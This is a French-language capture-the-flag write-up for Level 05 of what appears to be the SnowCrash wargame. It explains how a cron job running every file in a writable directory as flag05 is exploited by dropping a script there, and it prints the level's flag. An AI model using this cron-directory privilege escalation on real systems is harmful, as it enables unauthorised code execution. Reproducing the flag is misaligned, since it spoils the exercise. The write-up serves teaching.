# Level 05

## 📋 Informations

- **Domaine** : Élévation de Privilège (Cron Job / Shell Scripting)
- **Objectif** : Exploiter une tâche planifiée mal sécurisée pour exécuter du code en tant que `flag05`.

---

## 🔍 Exploration

En nous connectant sur le niveau, nous sommes accueillis par un message :
`You have new mail.`

Cela indique souvent qu'un fichier est présent dans `/var/mail/` ou `/var/spool/mail/` pour notre utilisateur.

```bash
cat /var/mail/level05
```

**Contenu du mail :**
```text
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

> [!NOTE]
> **Crontab**
> Cette ligne est une entrée de **Crontab** (le planificateur de tâches Linux).
> Elle indique que **toutes les 2 minutes** (`*/2`), le script `/usr/sbin/openarenaserver` est exécuté avec les droits de l'utilisateur `flag05` (`su -c ... - flag05`).

---

## 🛠️ Analyse

Analysons le script exécuté par le cron :

```bash
cat /usr/sbin/openarenaserver
```

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

**Ce que fait le script :**
1.  Il parcourt tous les fichiers trouvés dans le dossier `/opt/openarenaserver/`.
2.  Il les exécute avec `bash` (option `-x` pour le debug).
3.  Il les supprime immédiatement après (`rm -f`).

> [!IMPORTANT]
> **La faille**
> Le script exécute aveuglément tout ce qui se trouve dans ce dossier avec les droits de `flag05`.
> Si nous avons les droits d'écriture dans `/opt/openarenaserver/`, nous pouvons y déposer un script malveillant qui sera exécuté automatiquement dans les 2 prochaines minutes.

---

## 🔓 Résolution

### 1. Préparation du Payload
Nous allons créer un script qui exécute `getflag` et redirige la sortie vers un fichier temporaire (car nous ne verrons pas la sortie standard du cron).

```bash
echo "getflag > /tmp/flag05_output" > /opt/openarenaserver/exploit.sh
```

N'oublions pas de rendre le script exécutable (bien que `bash "$i"` l'exécuterait probablement quand même, c'est une bonne pratique).

```bash
chmod +x /opt/openarenaserver/exploit.sh
```

### 2. Attente
Le cron passe toutes les 2 minutes. Attendons...

### 3. Récupération du flag
Après quelques instants, vérifions si notre fichier de sortie a été créé.

```bash
cat /tmp/flag05_output
```

**Flag Final :**
```text
viuaaale9huek52boumoomioc
```

---

## 📚 Notions utiles

- **Cron & Crontab** : Système de planification de tâches sous Unix/Linux.
- **Autorisations de fichiers** : Comprendre qui peut écrire où est crucial pour l'élévation de privilèges.
